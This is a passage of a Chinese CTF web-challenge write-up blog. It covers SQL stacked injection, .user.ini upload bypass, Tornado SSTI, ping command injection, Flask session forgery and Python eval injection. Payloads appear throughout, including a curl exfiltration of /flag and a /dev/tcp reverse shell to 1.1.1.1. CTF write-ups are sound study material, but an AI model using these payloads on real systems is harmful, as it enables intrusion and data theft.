class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))))(((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))).(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))&amp;((((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))))(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;)|((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))).(((<span class="number">1</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).((((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">-2</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;)|(((<span class="number">-2</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;)|(((<span class="number">-2</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))))</span><br></pre></td></tr></table></figure><p>注意最后发送的时候需要再 URLencode 一下。</p><h3 id="3-强网杯-2019-随便注"><a href="#3-强网杯-2019-随便注" class="headerlink" title="3.[强网杯 2019]随便注"></a>3.[强网杯 2019]随便注</h3><p>推一波MrYunen师傅的<a href="https://xz.aliyun.com/t/7169#toc-47" target="_blank" rel="noopener">注入圣经</a></p><p>尝试语句<code>1&#39; or 1=1 #</code>发现返回多个结果，说明存在注入</p><p>接着 order by爆字段 发现就两个字段</p><p>然后查询数据，有过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br></pre></td></tr></table></figure><p>这里可以利用堆叠注入，原理很简单，就是通过 ; 号注入多条SQL语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1'; <span class="keyword">show</span> <span class="keyword">databases</span>; <span class="comment">#</span></span><br><span class="line">1';<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment">#</span></span><br><span class="line">1'; <span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span>; <span class="comment">#  //表名是数字用反引号</span></span><br></pre></td></tr></table></figure><p>flag就在这串数字表中</p><ol><li><p>通过编码绕过</p><p> 因为select被过滤了，所以先将 select * from  `1919810931114514` 进行16进制编码再通过构造payload得</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0';<span class="keyword">SeT</span>@a=<span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="keyword">prepare</span> execsql <span class="keyword">from</span> @a;<span class="keyword">execute</span> execsql;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p> 当然也可以通过 <code>char()</code></p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0';<span class="keyword">set</span> @s=<span class="keyword">concat</span>(<span class="built_in">char</span>(<span class="number">115</span>),<span class="built_in">char</span>(<span class="number">101</span>),<span class="built_in">char</span>(<span class="number">108</span>),<span class="built_in">char</span>(<span class="number">101</span>),<span class="built_in">char</span>(<span class="number">99</span>),<span class="built_in">char</span>(<span class="number">116</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">102</span>),<span class="built_in">char</span>(<span class="number">108</span>),<span class="built_in">char</span>(<span class="number">97</span>),<span class="built_in">char</span>(<span class="number">103</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">102</span>),<span class="built_in">char</span>(<span class="number">114</span>),<span class="built_in">char</span>(<span class="number">111</span>),<span class="built_in">char</span>(<span class="number">109</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">96</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">57</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">57</span>),<span class="built_in">char</span>(<span class="number">56</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">48</span>),<span class="built_in">char</span>(<span class="number">57</span>),<span class="built_in">char</span>(<span class="number">51</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">52</span>),<span class="built_in">char</span>(<span class="number">53</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">52</span>),<span class="built_in">char</span>(<span class="number">96</span>));<span class="keyword">PREPARE</span> a <span class="keyword">FROM</span> @s;<span class="keyword">EXECUTE</span> a;</span><br></pre></td></tr></table></figure><ul><li>prepare…from…是预处理语句，会进行编码转换。</li><li>execute用来执行由SQLPrepare创建的SQL语句。</li><li>SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。</li></ul></li><li><p>handler</p><p> mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'; <span class="keyword">handler</span> <span class="string">`1919810931114514`</span> <span class="keyword">open</span> <span class="keyword">as</span> <span class="string">`a`</span>; <span class="keyword">handler</span> <span class="string">`a`</span> <span class="keyword">read</span> <span class="keyword">next</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="4-SUCTF-2019-CheckIn"><a href="#4-SUCTF-2019-CheckIn" class="headerlink" title="4.[SUCTF 2019]CheckIn"></a>4.[SUCTF 2019]CheckIn</h3><p>文件的内容不能包含<code>&lt;?</code>，但可以上传<code>&lt;script language=&#39;php&#39;&gt;&lt;scirpt&gt;</code>类型的图片马来绕过</p><p>利用 <code>.user.ini</code>绕过,解析php</p><p>利用前提</p><ol><li>服务器脚本语言为PHP</li><li>服务器使用CGI／FastCGI模式</li><li>上传目录下要有可执行的php文件</li></ol><p><img src="/2020/06/6月刷题记录/image-20200608004804065.png" alt="image-20200608004804065"></p><p>关键在这两个关键字</p><p><img src="/2020/06/6月刷题记录/image-20200608004839982.png" alt="image-20200608004839982"></p><p><strong>auto_prepend_file</strong>是在文件前插入；<strong>auto_append_file</strong>在文件最后插入（当文件调用的有<code>exit()</code>时该设置无效）</p><p>先上传 <code>.user.ini</code></p><p><img src="/2020/06/6月刷题记录/image-20200608005009468.png" alt="image-20200608005009468"></p><p>接着传马</p><p><img src="/2020/06/6月刷题记录/image-20200608005047907.png" alt="image-20200608005047907"></p><p>再去访问上传目录即可获得flag</p><h3 id="5-护网杯-2018-easy-tornado"><a href="#5-护网杯-2018-easy-tornado" class="headerlink" title="5.[护网杯 2018]easy_tornado"></a>5.[护网杯 2018]easy_tornado</h3><p>flag.txt 提示flag在 <code>/fllllllllllllag</code> </p><p>welcome.txt 的render 可能存在SSTI注入</p><p>hints.txt 提示我们 filehash的加密格式 md5(cookie_secret+md5(filename))</p><p>先直接访问 <code>/fllllllllllllag</code>  直接报错，看URL应该是SSTI注入</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/error?msg=&#123;&#123;<span class="number">2</span>^<span class="number">1</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>直接回显 <code>3</code> ，过滤了很多符号，命令执行就别想了</p><p>说明确实存在注入。后面如何通过注入得到 cookie_secret实在是不知道</p><p>大佬一句 阅读tornado源码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/tornadoweb/</span>tornado<span class="regexp">/blob/m</span>aster<span class="regexp">/tornado/</span>auth.py</span><br></pre></td></tr></table></figure><p>发现<code>handler.settings</code>存放了cookie_secret （ORZ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">cookie_secret = <span class="string">'8bf1192d-691c-4345-8667-78a8a7899ff0'</span></span><br><span class="line">filename = <span class="string">'/fllllllllllllag'</span></span><br><span class="line">hash = hashlib.md5((cookie_secret + hashlib.md5(filename.encode()).hexdigest()).encode())</span><br><span class="line">print(hash.hexdigest())</span><br></pre></td></tr></table></figure><p>构造下URL即可拿到flag</p><h3 id="6-GXYCTF2019-Ping-Ping-Ping"><a href="#6-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="6.[GXYCTF2019]Ping Ping Ping"></a>6.[GXYCTF2019]Ping Ping Ping</h3><p>简单的命令注入</p><p>直接用 <code>;</code>分割命令成功，直接执行 <code>ls</code>回显 <code>flag.php</code>和<code>index.php</code>接着读<code>index.php</code>发现过滤了空格用 <code>$IFS$9</code>绕过</p><p>得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'ip'</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your symbol!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/ /"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your space!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/bash/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your bash!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/.*f.*l.*a.*g.*/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your flag!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">"ping -c 4 "</span>.$ip);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我用的是base64绕过</p><p>payload </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;`<span class="built_in">echo</span><span class="variable">$IFS</span><span class="variable">$9Y2F0IGZsYWcucGhwCg</span>==|base64<span class="variable">$IFS</span><span class="variable">$9</span>-d`</span><br></pre></td></tr></table></figure><p>其他payload</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">cat</span><span class="variable">$IFS</span><span class="variable">$1</span>`<span class="keyword">ls</span>`</span><br><span class="line"></span><br><span class="line"><span class="comment">// if(preg_match("/.*f.*l.*a.*g.*/", $ip))&#123;</span></span><br><span class="line"><span class="comment">//    die("fxck your flag!");</span></span><br><span class="line"><span class="comment">//匹配一个字符串中，是否按顺序出现过flag四个字母</span></span><br><span class="line">;a=<span class="keyword">g</span>;<span class="keyword">cat</span><span class="variable">$IFS</span><span class="variable">$1fla</span><span class="variable">$a</span>.php</span><br></pre></td></tr></table></figure><h3 id="7-HCTF-2018-admin"><a href="#7-HCTF-2018-admin" class="headerlink" title="7.[HCTF 2018]admin"></a>7.[HCTF 2018]admin</h3><p>在登录页面的注释中有一句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- you are not admin --&gt;</span></span><br></pre></td></tr></table></figure><p>随便注册个账号进去，在改变密码的页面注释泄露github地址<a href="https://github.com/woadsl1234/hctf_flask/" target="_blank" rel="noopener">https://github.com/woadsl1234/hctf_flask/</a></p><p>在index.html中</p><p><img src="/2020/06/6月刷题记录/image-20200622145001059.png" alt="image-20200622145001059"></p><p>admin登录后得到flag</p><p>这道题有两种解法</p><ul><li><p>session伪造</p><p>  根据P师傅的<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">文章</a>，flask的session都是在本地的，通过一个SECRET_KEY进行签名,可以直接使用<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">脚本</a>进行加解密</p>  <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager<span class="number">3</span>.py decode -<span class="keyword">c</span> .eJxFUE<span class="number">2</span>LwjAU_CvLO<span class="number">3</span>uIFi-CB<span class="number">6E2</span>VHgvWFLDy<span class="number">0</span>VcrW<span class="number">3</span>axoW<span class="number">2</span>Ylvxv<span class="number">2</span>_Xhd<span class="number">3</span>DnGaYryccr<span class="number">03</span>WFrDqmns<span class="number">2</span>g<span class="number">6</span>O<span class="number">7</span>wOoJH<span class="number">5</span>-wAlzgkj<span class="number">0</span>LNFQrmRQqjAXrxOF<span class="number">4</span>FlZHzpZFhWFRsIk<span class="number">8</span>euvYpAPrNKCSfrRLJdOedT<span class="number">5</span>ajz<span class="number">3</span>Jg<span class="number">1</span>fhXqCO<span class="number">59</span>bwYP<span class="number">2</span>hVLoKUMYPkuR<span class="number">5</span>rAb<span class="number">2</span>SUmG<span class="number">52</span>xQqHDnUEbeSlzwuFnimAdWpsOE<span class="number">0</span>YYHN-XXrLlHiQMZXMNrBue<span class="number">2</span>uR<span class="number">67</span>ryq<span class="number">7</span>_U<span class="number">2</span>wfttbY<span class="number">2</span>vUG<span class="number">0</span>EyqaZaAZdFjT<span class="number">6</span>pyewXpPePqcZAeleRjAMVbgVt<span class="number">1</span>m<span class="number">8750959</span>n<span class="number">9</span>GZAXlv<span class="number">8</span>zt<span class="number">5</span>CcCuqztYAb<span class="number">3</span>Nmvet<span class="number">8</span>FcwOsb<span class="number">4</span>eJsVg.XvhXYA.DtOXFn-B-CxhrW<span class="number">07</span>nqEb<span class="number">1</span><span class="keyword">i9</span>eswM</span><br><span class="line"></span><br><span class="line">'&#123;<span class="string">"_fresh"</span>:True,<span class="string">"_id"</span>:b<span class="string">"3c9bf41ce8da824a4b374e1bf8d08aaaf2fbae2a5763a8298e1a83fc14ef844125ef2fec9970b04cfc92bdc5f5ac482b0afdc6c09387de2de3d5be1ea610c25c"</span>,<span class="string">"csrf_token"</span>:b<span class="string">"fa1efe1044dd827b8e2de5d654099252d4b78144"</span>,<span class="string">"image"</span>:b<span class="string">"0Vt6"</span>,<span class="string">"name"</span>:<span class="string">"admin"</span>,<span class="string">"user_id"</span>:<span class="string">"10"</span>&#125;'</span><br></pre></td></tr></table></figure><p>  然后源码中有SECRET_KEY</p><p>  <img src="/2020/06/6月刷题记录/image-20200622144648942.png" alt="image-20200622144648942"></p>  <figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -t "&#123;<span class="string">'_fresh'</span>: True,<span class="string">'_id'</span>: b<span class="string">'3c9bf41ce8da824a4b374e1bf8d08aaaf2fbae2a5763a8298e1a83fc14ef844125ef2fec9970b04cfc92bdc5f5ac482b0afdc6c09387de2de3d5be1ea610c25c'</span>,<span class="string">'csrf_token'</span>:b<span class="string">'fa1efe1044dd827b8e2de5d654099252d4b78144'</span>,<span class="string">'image'</span>:b<span class="string">'0Vt6'</span>,<span class="string">'name'</span>:<span class="string">'admin'</span>,<span class="string">'user_id'</span>:<span class="string">'10'</span>&#125;" -s ckj123</span><br><span class="line">.eJxFUE1rwkAQ_Stlzh5WgxfBgxCzRJgJho3L7EWsxmSTjIWomET8700ttId3eo_39YT9uc2vJSxu7T2fwN6fYPGEj09YAM5wzsIKLTWJTsskjBWb1ONwVM5E3lVljWFZso0ExXm2Wc8mC6iiH-080VnHphicYEd6J0m4VWjiqbPcO9lViakD1PGDNAkPdc-SVmR5yhZVEm486kicxhkPqzkOReB01o8YXLjzY37DhjvU2JPFJbwmcLy25_3tq84vfxOcrDtnXYNmpUin9Vgr4KpsUNKG7HZGZvsYa_RkNjXpOEjCtaLV8m3n5VDk_2dETlHxy1wOMhJwOIm_wATu17x9_wZTBa9vTipsnw.XvhesQ.opeFEuwbfnBJs_j3BEQR_eCGvXE</span><br></pre></td></tr></table></figure></li></ul><pre><code>用这个cookie访问 即可得到flag</code></pre><ul><li><p>Unicode欺骗</p><p>  源码中显示，各种操作前都会对用户名进行自定义的strlower</p>  <figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span><span class="params">(username)</span></span><span class="symbol">:</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure><p>  nodeprep.prepare对应的库是Twisted，requirements.txt中显示Twisted==10.2.0</p><p>  版本非常老。</p><p>  unicode问题，对于一些特殊字符，nodeprep.prepare会进行如下操作</p>  <figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ᴬ -&gt; A -&gt; a</span><br></pre></td></tr></table></figure><p>  即第一次将其转换为大写，第二次将其转换为小写</p><p>  那么，攻击链大概就这样</p><ul><li>注册用户ᴬdmin</li><li>登录用户ᴬdmin，变成Admin</li><li>修改密码Admin，更改了admin的密码</li></ul></li></ul><h3 id="8-DASCTF-六月赛-简单的计算题"><a href="#8-DASCTF-六月赛-简单的计算题" class="headerlink" title="8.[DASCTF 六月赛]简单的计算题"></a>8.<strong>[DASCTF 六月赛]简单的计算题</strong></h3><p>最开始的源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request,session</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> create</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## flag is in /flag try to get it</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(string)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"or"</span> <span class="keyword">in</span> string:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"hack"</span></span><br><span class="line">        <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        input = request.form[<span class="string">'input'</span>]</span><br><span class="line">        create_question = create()</span><br><span class="line">        input_question = session.get(<span class="string">'question'</span>)</span><br><span class="line">        session[<span class="string">'question'</span>] = create_question</span><br><span class="line">        <span class="keyword">if</span> input_question==<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=<span class="string">"Invalid session please try again!"</span>, question=create_question)</span><br><span class="line">        <span class="keyword">if</span> filter(input)==<span class="string">"hack"</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=<span class="string">"hack"</span>, question=create_question)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            calc_result = str((eval(input_question + <span class="string">"="</span> + str(input))))</span><br><span class="line">            <span class="keyword">if</span> calc_result == <span class="string">'True'</span>:</span><br><span class="line">                result = <span class="string">"Congratulations"</span></span><br><span class="line">            <span class="keyword">elif</span> calc_result == <span class="string">'False'</span>:</span><br><span class="line">                result = <span class="string">"Error"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = <span class="string">"Invalid"</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result = <span class="string">"Invalid"</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=result,question=create_question)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        create_question = create()</span><br><span class="line">        session[<span class="string">'question'</span>] = create_question</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,question=create_question)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">return</span> open(<span class="string">"app.py"</span>, <span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>只过滤了 <code>or</code> ,因为不是直接回显，所以考虑盲注，但是也可以反弹shell，curl外带</p><p>curl外带</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1234</span>|<span class="built_in">os</span>.<span class="built_in">popen</span>(<span class="string">'cat /flag | curl http://1.1.1.1:2333 --data-binary @-'</span>).<span class="built_in">read</span>()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/6月刷题记录/image-20200628174548750.png" alt="image-20200628174548750"></p><p>反弹shell</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">1234</span>|<span class="selector-tag">open</span>(<span class="string">'/tmp/c.sh'</span>,<span class="string">'w'</span>)<span class="selector-class">.write</span>(<span class="string">'/bin/bash -i &gt; /dev/tcp/1.1.1.1/2333 0&gt;&amp;1'</span>),<span class="selector-tag">os</span><span class="selector-class">.system</span>(<span class="string">'/bin/bash /tmp/c.sh'</span>)</span><br></pre></td></tr></table></figure><p>盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = <span class="string">"abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;_"</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"DASCTF"</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="comment"># time.sleep(0.5)</span></span><br><span class="line">    url = <span class="string">"http://183.129.189.60:10026/"</span></span><br><span class="line">    data=&#123;<span class="string">'input'</span>:<span class="string">'1234|os.system(\'cat /flag|grep &#123;&#125; &amp;&amp; sleep 2\')'</span>.format(payload + i)&#125;</span><br><span class="line">    print(data)</span><br><span class="line">    first = time.time()</span><br><span class="line">    r = requests.post(url=url,data=data)</span><br><span class="line">    <span class="comment">#print(r.text)</span></span><br><span class="line">    second = time.time()</span><br><span class="line">    offset = second-first</span><br><span class="line">    <span class="keyword">if</span> offset &gt; <span class="number">2</span>:</span><br><span class="line">        payload = payload+i</span><br><span class="line">        print(payload)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>后面题目下线了，听说是被<code>os.system()</code>打穿了</p><h3 id="9-DASCTF-六月赛-简单的计算题2"><a href="#9-DASCTF-六月赛-简单的计算题2" class="headerlink" title="9.[DASCTF 六月赛]简单的计算题2"></a>9.<strong>[DASCTF 六月赛]简单的计算题2</strong></h3><p>其他和1一样，但过滤更严格了</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> request.<span class="keyword">method</span><span class="operator"> == </span>'POST':</span><br><span class="line">        input = request.form<span class="literal">['<span 